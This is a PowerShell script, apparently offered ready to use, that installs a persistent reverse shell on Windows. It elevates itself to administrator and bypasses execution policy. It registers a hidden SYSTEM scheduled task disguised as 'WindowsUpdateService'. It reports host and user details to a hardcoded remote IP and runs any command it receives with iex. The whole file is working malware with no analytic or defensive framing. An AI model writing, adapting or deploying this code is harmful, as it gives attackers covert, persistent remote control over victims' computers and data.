# reverse_shell.ps1 - Persistent Admin Reverse Shell
$serverIP = "147.185.221.31"  # ← UPDATE WITH YOUR ARCH IP
$serverPort = 47034
$reconnectDelay = 15
$localPayloadPath = "$env:APPDATA\Microsoft\Windows\reverse_shell.ps1"

# Self-elevate to admin if not already
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "-ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Definition)`""
    Start-Process powershell.exe -ArgumentList $arguments -Verb RunAs
    exit
}

# Install persistent scheduled task if not exists
$taskName = "WindowsUpdateService"
if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
    $trigger1 = New-ScheduledTaskTrigger -AtStartup
    $trigger2 = New-ScheduledTaskTrigger -AtLogOn
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$localPayloadPath`""
    Register-ScheduledTask -TaskName $taskName -Trigger @($trigger1, $trigger2) -Action $action -Principal $principal -Description "System Update Service" -Force
}

function Get-SystemInfo {
    $hostname = $env:COMPUTERNAME
    $username = $env:USERNAME
    $os = (Get-WmiObject Win32_OperatingSystem).Caption
    return "SYSINFO:$hostname|$username|$os"
}

# Main persistent loop
while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient
        $client.Connect($serverIP, $serverPort)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.WriteLine((Get-SystemInfo))
        
        while ($true) {
            try {
                $command = $reader.ReadLine()
                if (-not $command) { break }
                if ($command -eq "exit") { break }
                $result = iex $command 2>&1 | Out-String
                $writer.Write($result)
            }
            catch {
                $errorOutput = "ERROR: $($_.Exception.Message)`n"
                $writer.Write($errorOutput)
            }
        }
    }
    catch { }
    finally {
        if ($client) { $client.Close() }
    }
    Start-Sleep -Seconds $reconnectDelay
}
